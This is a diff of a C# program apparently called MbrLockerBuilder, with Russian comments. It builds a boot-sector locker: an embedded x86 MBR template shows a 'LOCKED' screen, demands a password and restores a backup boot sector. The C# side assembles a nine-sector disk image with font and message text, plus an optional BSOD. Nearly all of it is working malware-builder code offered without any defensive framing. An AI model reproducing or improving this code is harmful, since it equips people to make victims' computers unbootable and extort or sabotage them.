@@ -292,13 +292,34 @@ namespace MbrLockerBuilder
                     int x = 20;
                     int y = 20;
 
-                    string fullText = title + "\r\n\r\n" + body;
+                    string border = "========================================";
+                    g.DrawString(border, font, brush, x, y);
+                    y += 20;
 
-                    string[] lines = fullText.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
-                    foreach (string line in lines)
+                    string titleLine = "     " + title + "     ";
+                    g.DrawString(titleLine, font, brush, x, y);
+                    y += 20;
+
+                    g.DrawString(border, font, brush, x, y);
+                    y += 25;
+
+                    string[] bodyLines = body.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
+                    foreach (string line in bodyLines)
                     {
-                        g.DrawString(line.Trim(), font, brush, x, y);
-                        y += 20;
+                        string wrapped = line.Trim();
+                        while (wrapped.Length > 60)
+                        {
+                            int cut = 60;
+                            if (cut > wrapped.Length) cut = wrapped.Length;
+                            g.DrawString(wrapped.Substring(0, cut), font, brush, x, y);
+                            y += 18;
+                            wrapped = wrapped.Substring(cut);
+                        }
+                        if (wrapped.Length > 0)
+                        {
+                            g.DrawString(wrapped, font, brush, x, y);
+                            y += 18;
+                        }
                     }
 
                     y += 5;
@@ -328,7 +349,7 @@ namespace MbrLockerBuilder
                         {
                             if (stream != null)
                             {
-                                byte[] font = new byte[1024];
+                                byte[] font = new byte[1024]; // ← 1024 байта (статья)
                                 stream.Read(font, 0, 1024);
                                 return font;
                             }
@@ -362,6 +383,9 @@ namespace MbrLockerBuilder
 
         private string GenerateMBR()
         {
+            // ============================================================
+            // ТВОЙ СТАРЫЙ РАБОЧИЙ ШАБЛОН, НО С НОВЫМИ СЕКТОРАМИ
+            // ============================================================
             string template = @"BITS 16
 ORG 0x7C00
 
@@ -380,7 +404,7 @@ start:
 
     mov ah, 0x06
     mov al, 0
-    mov bh, BG_COLOR
+    mov bh, 0x00
     mov cx, 0
     mov dx, 0x184F
     int 0x10
@@ -389,7 +413,7 @@ start:
     mov es, ax
     mov bx, 0x1000
     mov ah, 0x02
-    mov al, 2
+    mov al, 2          ; ← 2 СЕКТОРА (ШРИФТ 1024 БАЙТА)
     mov ch, 0
     mov cl, 3
     mov dh, 0
@@ -405,9 +429,9 @@ start:
     mov es, ax
     mov bx, 0x9000
     mov ah, 0x02
-    mov al, 2
+    mov al, 2          ; ← 2 СЕКТОРА (ТЕКСТ 1024 БАЙТА)
     mov ch, 0
-    mov cl, 5
+    mov cl, 5          ; ← СЕКТОР 5 (ВМЕСТО 11)
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -459,7 +483,7 @@ restore_mbr:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 2
+    mov cl, 2          ; ← БЭКАП В СЕКТОРЕ 2
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -485,7 +509,7 @@ print:
     jz .done
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, FG_COLOR
+    mov bl, 0x07
     int 0x10
     jmp print
 .done:
@@ -507,7 +531,7 @@ get_password:
     stosb
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, FG_COLOR
+    mov bl, 0x07
     mov al, [di - 1]
     int 0x10
     jmp .loop
@@ -517,7 +541,7 @@ get_password:
     dec di
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, FG_COLOR
+    mov bl, 0x07
     mov al, 0x08
     int 0x10
     mov al, ' '
@@ -529,7 +553,7 @@ get_password:
     mov byte [di], 0
     mov ah, 0x0E
     mov bh, 0x00
-    mov bl, FG_COLOR
+    mov bl, 0x07
     mov al, 0x0A
     int 0x10
     mov al, 0x0D
@@ -577,6 +601,9 @@ password_ok:
 times 510 - ($ - start) db 0
 dw 0xAA55";
 
+            // ============================================================
+            // ТВОЯ СТАРАЯ РАБОЧАЯ ЛОГИКА ЗАМЕНЫ ПАРОЛЯ И ЦВЕТОВ
+            // ============================================================
             string password = this.txtPassword.Text.Trim();
             if (string.IsNullOrEmpty(password)) password = "admin";
 
@@ -628,8 +655,8 @@ dw 0xAA55";
                 case 7: bgColor = "70"; break;
             }
 
-            template = template.Replace("BG_COLOR", bgColor);
-            template = template.Replace("FG_COLOR", textColor);
+            template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
+            template = template.Replace("mov bl, 0x07", "mov bl, 0x" + textColor);
 
             bool enableBSOD = this.chkBSOD.Checked;
             if (enableBSOD)
@@ -769,11 +796,16 @@ dw 0xAA55";
                 this.lblStatus.Text = "3/7 Сборка образа...";
                 Application.DoEvents();
 
+                // ============================================================
+                // НОВАЯ СТРУКТУРА: 9 СЕКТОРОВ (0-8)
+                // ============================================================
                 int totalSectors = 9;
                 byte[] fullImage = new byte[512 * totalSectors];
 
+                // 1. MBR (сектор 0)
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
 
+                // 2. Шрифт (сектора 3-4) — 2 сектора = 1024 байта
                 byte[] fontData = GenerateCP866Font();
                 if (fontData != null && fontData.Length >= 1024)
                 {
@@ -787,6 +819,7 @@ dw 0xAA55";
                     Array.Copy(paddedFont, 0, fullImage, 512 * 3, 1024);
                 }
 
+                // 3. Текст (сектора 5-6) — 2 сектора = 1024 байта
                 string title = this.txtTitle.Text.Trim();
                 if (string.IsNullOrEmpty(title)) title = "LOCKED";
                 string body = this.txtBody.Text.Trim();
